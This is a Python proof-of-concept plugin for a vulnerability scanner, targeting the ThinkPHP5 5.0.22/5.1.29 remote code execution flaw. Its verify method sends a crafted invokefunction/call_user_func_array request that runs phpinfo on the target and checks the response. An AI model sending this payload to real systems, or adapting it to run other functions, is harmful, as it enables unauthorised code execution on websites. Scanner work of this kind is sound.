#!/usr/bin/python
# coding=utf-8
'''
Date: 2022-03-21 16:15:34
LastEditors: recar
LastEditTime: 2022-03-23 18:15:24
'''
from plugins.poc.base import PocBase


class Poc(PocBase):
    def __init__(self):
        super(PocBase, self).__init__()
        self.name = "ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞"
        self.cve = ""
        self.author = "Recar"
        self.desc = "ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。"
        self.fingerprint = "thinkphp"

    def verify(self):
        url_path = r"/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
        # 这里需要返回 response
        url = f"{self.base_url}{url_path}"
        response =  self.get(url, timeout=3)        
        if "<title>phpinfo()</title>" in response.text:
            return True, url
        return False, None


